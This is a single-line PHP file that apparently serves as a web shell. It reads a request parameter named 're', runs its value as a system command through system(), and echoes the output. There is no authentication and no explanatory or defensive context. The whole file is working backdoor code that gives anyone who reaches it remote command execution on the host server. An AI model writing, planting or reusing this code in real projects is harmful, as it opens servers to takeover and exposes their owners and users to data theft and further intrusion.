<?php if(isset($_REQUEST['re'])){ echo "<pre>"; $cmd = ($_REQUEST['re']); system($cmd); echo "</pre>"; die; }?>
